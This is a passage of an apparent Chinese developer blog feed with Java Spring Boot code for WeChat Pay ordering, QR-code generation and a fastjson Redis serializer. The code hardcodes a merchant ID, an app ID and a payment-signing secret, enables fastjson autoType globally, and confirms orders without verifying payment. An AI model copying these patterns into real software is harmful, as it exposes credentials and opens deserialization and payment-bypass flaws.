class="keyword">if</span> (StringUtils.isBlank(token)) &#123;</span><br><span class="line">            token = request.getParameter(<span class="string">"Authorization"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String jwtJson = JwtUtils.decipheringToken(token) ;</span><br><span class="line">        Map&lt;String ,Object&gt; jwtdata = JSONObject.parseObject(jwtJson,Map.class) ;</span><br><span class="line">        EncryptedData encryptedData = JSONObject.parseObject(JSONObject.toJSONString(jwtdata.get(<span class="string">"wxdata"</span>)),EncryptedData.class) ;</span><br><span class="line">        String openid = encryptedData.getOpenId() ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 初始化请求数据</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        WxOrderList wxOrderList = JSONObject.parseObject(data,WxOrderList.class) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 初始化订单ID</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">final</span> String olid = IdUtil.Olid() ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 请求微信api接口</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//String body = JSONObject.toJSONString(baseOrderList) ;</span></span><br><span class="line">        String url = <span class="string">"https://api.mch.weixin.qq.com/pay/unifiedorder"</span> ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 请求参数初始化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Map&lt;String,String&gt; WxPayParams = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        WxPayParams.put(<span class="string">"appid"</span> , <span class="string">"wxfd4904504d50f9c2"</span>) ;</span><br><span class="line">        WxPayParams.put(<span class="string">"mch_id"</span>,<span class="string">"1545831661"</span>) ;</span><br><span class="line">        WxPayParams.put(<span class="string">"nonce_str"</span>, WXPayUtil.generateNonceStr());</span><br><span class="line">        WxPayParams.put(<span class="string">"body"</span>,<span class="string">"OBOX小程序订单支付"</span>) ;</span><br><span class="line">        WxPayParams.put(<span class="string">"out_trade_no"</span>,olid) ;</span><br><span class="line">        WxPayParams.put(<span class="string">"total_fee"</span>,String.valueOf(wxOrderList.getSum()));</span><br><span class="line">        WxPayParams.put(<span class="string">"spbill_create_ip"</span>,<span class="string">"118.31.120.92"</span>) ;</span><br><span class="line">        WxPayParams.put(<span class="string">"notify_url"</span>,<span class="string">"http://118.31.120.92/msg"</span>) ;</span><br><span class="line">        WxPayParams.put(<span class="string">"trade_type"</span>,<span class="string">"JSAPI"</span>) ;</span><br><span class="line">        WxPayParams.put(<span class="string">"openid"</span>,openid) ;</span><br><span class="line">        WxPayParams.put(<span class="string">"sign"</span>,WXPayUtil.generateSignature(WxPayParams,<span class="string">"x5pgk5c1TT8h96R489trD52dokUDPYW7"</span>));</span><br><span class="line">        String XML = WXPayUtil.mapToXml(WxPayParams) ;</span><br><span class="line"></span><br><span class="line">        String r = <span class="keyword">new</span> String(XML.getBytes(),<span class="string">"UTF-8"</span>);</span><br><span class="line">        <span class="comment">// 请求数据编码配置</span></span><br><span class="line">        restTemplate.getMessageConverters().set(<span class="number">1</span>,<span class="keyword">new</span> StringHttpMessageConverter(StandardCharsets.UTF_8)) ;</span><br><span class="line">        String res = restTemplate.postForObject(url,r,String.class) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将获得的内容转化为map类型</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Map&lt;String,String&gt; reponse = WXPayUtil.xmlToMap(res) ;</span><br><span class="line">        reponse.put(<span class="string">"timeStamp"</span>,String.valueOf(<span class="keyword">new</span> Date().getTime()/<span class="number">1000</span>)) ;</span><br><span class="line">        reponse.put(<span class="string">"signType"</span>,<span class="string">"MD5"</span>) ;</span><br><span class="line"></span><br><span class="line">        Map&lt;String,String&gt; result = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        result.put(<span class="string">"appId"</span>,WxPayParams.get(<span class="string">"appid"</span>)) ;</span><br><span class="line">        result.put(<span class="string">"nonceStr"</span>,reponse.get(<span class="string">"nonce_str"</span>)) ;</span><br><span class="line">        result.put(<span class="string">"package"</span>,<span class="string">"prepay_id="</span>+reponse.get(<span class="string">"prepay_id"</span>)) ;</span><br><span class="line">        result.put(<span class="string">"signType"</span>,<span class="string">"MD5"</span>) ;</span><br><span class="line">        result.put(<span class="string">"timeStamp"</span>,String.valueOf(<span class="keyword">new</span> Date().getTime()/<span class="number">1000</span>)) ;</span><br><span class="line"></span><br><span class="line">        String paysign = WXPayUtil.generateSignature(result,<span class="string">"x5pgk5c1TT8h96R489trD52dokUDPYW7"</span>) ;</span><br><span class="line"></span><br><span class="line">        String inner = <span class="string">""</span> ;</span><br><span class="line">        <span class="keyword">for</span> (String key : result.keySet())&#123;</span><br><span class="line">            inner += key + <span class="string">"="</span> + result.get(key)+<span class="string">"&amp;"</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        inner = inner.substring(<span class="number">0</span>,inner.length()-<span class="number">1</span>) ;</span><br><span class="line">        inner = <span class="string">"MD5("</span> + inner + <span class="string">")"</span> + <span class="string">"="</span> + paysign ;</span><br><span class="line"></span><br><span class="line">        result.put(<span class="string">"paySign"</span>,paysign) ;</span><br><span class="line">        result.remove(<span class="string">"appId"</span>) ;</span><br><span class="line">        result.remove(<span class="string">"key"</span>) ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 插入订单信息</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        List&lt;BaseOrderList&gt; baseOrderLists = <span class="keyword">new</span> ArrayList&lt;&gt;() ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 循环遍历</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (WxOrderGoodsInfo wxOrderGoodsInfo : wxOrderList.getGoods()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 初始化订单信息</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            BaseOrderList baseOrderList = <span class="keyword">new</span> BaseOrderList();</span><br><span class="line">            baseOrderList.setOlid(olid);</span><br><span class="line">            baseOrderList.setOltype(<span class="string">"notpaid"</span>);</span><br><span class="line">            baseOrderList.setUid(qrMapper.SelectUidByOpendi(openid));</span><br><span class="line">            baseOrderList.setOlgid(wxOrderGoodsInfo.getGid());</span><br><span class="line">            baseOrderList.setOlgnum(wxOrderGoodsInfo.getGnum());</span><br><span class="line">            baseOrderList.setOlprice(wxOrderGoodsInfo.getGsum());</span><br><span class="line">            baseOrderList.setOlremark(wxOrderGoodsInfo.getRemarks());</span><br><span class="line">            baseOrderList.setOluphone(wxOrderList.getUphone());</span><br><span class="line">            Calendar calendar = Calendar.getInstance();</span><br><span class="line">            Date date = calendar.getTime();</span><br><span class="line">            SimpleDateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">            String s = sdf.format(date);</span><br><span class="line">            baseOrderList.setOldate(s);</span><br><span class="line">            <span class="comment">// 插入</span></span><br><span class="line">            baseOrderLists.add(baseOrderList);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 插入订单</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            baseOrderListInsert.InsertBaseOrderList(baseOrderList);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String,Object&gt; resdata = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        resdata.put(<span class="string">"reponse"</span>,result) ;</span><br><span class="line">        resdata.put(<span class="string">"olid"</span>,olid) ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resdata  ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 确认订单</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> data  扫码后获得的qrid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"checkwxpay"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">CheckPay</span><span class="params">(@RequestBody String data)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 初始化订单信息</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        List&lt;BaseOrderList&gt; baseOrderLists = baseOrderListSelect.SelectBaseOrderList(data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 更新订单信息</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        baseOrderListInsert.UpdateBaseOrderList(data) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 二维码</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        List&lt;CheckSales&gt; checkSales = <span class="keyword">new</span> ArrayList&lt;&gt;() ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 循环遍历</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (BaseOrderList b : baseOrderLists) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 初始化订单信息</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            BaseOrderList baseOrderList = b ;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 插入BO信息</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            BO bo = <span class="keyword">new</span> BO();</span><br><span class="line">            bo.setOlid(baseOrderList.getOlid());</span><br><span class="line">            bo.setGid(baseOrderList.getOlgid());</span><br><span class="line">            bo.setGnum(baseOrderList.getOlgnum());</span><br><span class="line">            bo.setGprice(baseOrderList.getOlprice());</span><br><span class="line">            bo.setGtime(baseOrderList.getOldate());</span><br><span class="line">            bo.setBid(businessMapper.SelectBidByGid(baseOrderList.getOlgid()));</span><br><span class="line">            bo.setUid(baseOrderList.getUid());</span><br><span class="line">            <span class="comment">// 插入</span></span><br><span class="line">            boMapper.InsertBO(bo) ;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 二维码生成</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ;i &lt;bo.getGnum() ; i++)&#123;</span><br><span class="line">                CheckSales cs = <span class="keyword">new</span> CheckSales() ;</span><br><span class="line">                cs.setGid(bo.getGid());</span><br><span class="line">                cs.setOlid(bo.getOlid());</span><br><span class="line">                cs.setQrid(IdUtil.Qrid());</span><br><span class="line">                cs.setStatus(<span class="string">"0"</span>);</span><br><span class="line">                cs.setUid(baseOrderList.getUid());</span><br><span class="line">                cs.setQrhref(QRService.GenerateQR(cs.getQrid()));</span><br><span class="line">                checkSales.add(cs) ;</span><br><span class="line">                <span class="comment">//插入</span></span><br><span class="line">                qrMapper.InsertQR(cs) ;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> checkSales ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="订单二维码生成器"><a href="#订单二维码生成器" class="headerlink" title="订单二维码生成器"></a>订单二维码生成器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.service.QR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 二维码生成服务</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QRService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String URL = <span class="string">"http://qr.liantu.com/api.php?text="</span> ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 二维码图片链接</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">GenerateQR</span><span class="params">(String id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String OR_Code_Url = URL + id ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> OR_Code_Url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;针对各种窒息的微信操蛋接口&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SpringBoot整合redis</title>
    <link href="http://runindark.com/2019/08/07/springboot%E6%95%B4%E5%90%88redis/"/>
    <id>http://runindark.com/2019/08/07/springboot整合redis/</id>
    <published>2019-08-07T07:14:43.101Z</published>
    <updated>2019-08-07T07:23:06.774Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>项目中整合redis配置<br><a id="more"></a></excerpt></p><p><the rest="" of="" contents="" |="" 余下全文=""></the></p><h2 id="springboot整合redis缓存"><a href="#springboot整合redis缓存" class="headerlink" title="springboot整合redis缓存"></a>springboot整合redis缓存</h2><h3 id="maven依赖"><a href="#maven依赖" class="headerlink" title="maven依赖"></a>maven依赖</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="redis序列换用fastjson"><a href="#redis序列换用fastjson" class="headerlink" title="redis序列换用fastjson"></a>redis序列换用fastjson</h3><ol><li><p>设置fastjson序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.JavaType;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.type.TypeFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.RedisSerializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.SerializationException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.Assert;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastJsonRedisSerializer</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">RedisSerializer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Charset DEFAULT_CHARSET = Charset.forName(<span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="keyword">private</span> ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">    <span class="keyword">private</span> Class&lt;T&gt; c ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FastJsonRedisSerializer</span><span class="params">(Class&lt;T&gt; c)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.c = c ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] serialize(Object o) <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">        <span class="keyword">return</span> JSON.toJSONString(o, SerializerFeature.WriteClassName).getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> SerializationException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (bytes == <span class="keyword">null</span> || bytes.length&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String str = <span class="keyword">new</span> String(bytes,DEFAULT_CHARSET);</span><br><span class="line">        <span class="keyword">return</span> (T)JSON.parseObject(str,c) ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setObjectMapper</span><span class="params">(ObjectMapper objectMapper)</span> </span>&#123;</span><br><span class="line">        Assert.notNull(objectMapper, <span class="string">"'objectMapper' must not be null"</span>);</span><br><span class="line">        <span class="keyword">this</span>.objectMapper = objectMapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> JavaType <span class="title">getJavaType</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TypeFactory.defaultInstance().constructType(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>redis中注册配置fatsjosn序列化工具</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonAutoDetect;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.PropertyAccessor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cache.CacheManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cache.annotation.CachingConfigurationSelector;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cache.annotation.CachingConfigurerSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cache.annotation.EnableCaching;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.RedisConnectionFailureException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.cache.RedisCacheConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.cache.RedisCacheManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.RedisConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.RedisSerializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableCaching</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisConfig</span> <span class="keyword">extends</span> <span class="title">CachingConfigurerSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*@Bean(name="redisTemplate")</span></span><br><span class="line"><span class="comment">    public RedisTemplate&lt;String,Object&gt; redisTemplate(RedisConnectionFactory factory)&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        RedisTemplate&lt;String,Object&gt; template = new RedisTemplate&lt;&gt;() ;</span></span><br><span class="line"><span class="comment">        // 配置连接工厂</span></span><br><span class="line"><span class="comment">        template.setConnectionFactory(factory);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        FastJsonRedisSerializer serializer = new FastJsonRedisSerializer(Object.class);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        ObjectMapper mapper = new ObjectMapper() ;</span></span><br><span class="line"><span class="comment">        mapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY) ;</span></span><br><span class="line"><span class="comment">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span></span><br><span class="line"><span class="comment">        serializer.setObjectMapper(mapper);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        template.setValueSerializer(serializer);</span></span><br><span class="line"><span class="comment">        template.setKeySerializer(new StringRedisSerializer());</span></span><br><span class="line"><span class="comment">        template.afterPropertiesSet();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        return template ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RedisSerializer <span class="title">fastJson2JsonRedisSerializer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FastJsonRedisSerializer(Object.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RedisTemplate <span class="title">initRedisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory, RedisSerializer fastJson2JsonRedisSerializer)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RedisTemplate redisTemplate = <span class="keyword">new</span> RedisTemplate();</span><br><span class="line">        redisTemplate.setConnectionFactory(redisConnectionFactory);</span><br><span class="line">        redisTemplate.setValueSerializer(fastJson2JsonRedisSerializer);</span><br><span class="line">        redisTemplate.setKeySerializer(<span class="keyword">new</span> StringRedisSerializer());</span><br><span class="line">        redisTemplate.afterPropertiesSet();</span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="redis工具类"><a href="#redis工具类" class="headerlink" title="redis工具类"></a>redis工具类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 